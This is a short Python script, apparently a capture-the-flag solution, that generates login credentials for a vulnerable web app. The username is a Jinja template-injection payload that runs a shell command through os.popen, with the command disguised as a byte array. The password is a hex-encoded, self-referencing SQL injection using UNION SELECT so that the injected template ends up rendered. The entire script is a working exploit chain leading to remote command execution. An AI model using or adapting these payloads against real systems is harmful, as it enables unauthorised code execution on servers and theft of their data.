
user_payload = "{{url_for.__globals__.os.popen(url_for.__globals__.__builtins__.bytes([47,114,101,97,100,102,108,97,103]).decode()).read()}}\\"

user_hex = "0x" + user_payload.encode('utf-8').hex().upper()

template = f") UNION SELECT {user_hex}, REPLACE($$,0x2424,CONCAT(0x3078,HEX($$)))#"

template_hex = template.encode('utf-8').hex().upper()

pass_payload = template.replace("$$", "0x" + template_hex)

print('==================================================================\n\n')
print('username:',user_payload)
print('\n\n==================================================================\n\n')
print('password:',pass_payload +'\n\n')
